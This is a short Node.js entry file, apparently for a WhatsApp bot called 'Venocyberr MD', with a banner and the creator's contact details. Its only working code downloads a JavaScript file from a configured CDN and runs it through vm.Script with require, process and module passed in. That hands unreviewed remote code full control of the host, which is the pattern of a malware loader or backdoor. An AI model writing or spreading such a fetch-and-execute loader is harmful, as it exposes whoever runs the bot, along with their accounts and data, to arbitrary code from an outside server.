/*

$$$$$$\            $$\                                               
$$  __$$\           $$ |                                              
$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
 \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
 \______/  \______/ \_______/ \________| \_______|\__|       \______/

@ Project Name : Venocyberr MD
* Creator      : Rajola

* My Git       : https//github.com/mrfr8nk
* Contact      : wa.me/255764489397
* Channel      : https://whatsapp.com/channel/0029Vb7D70MI7BeC0xUnKb05
* Release Date : 15 December 2024 12.01 AM
*/


// TANZANIAN STAR ON TOP
const axios = require('axios');
const vm = require('vm');
const config = require('./settings.js');

(async () => {
  try {
    console.log("❄️ Venocyber Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`${config.CDN}/mrfrank/index.js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
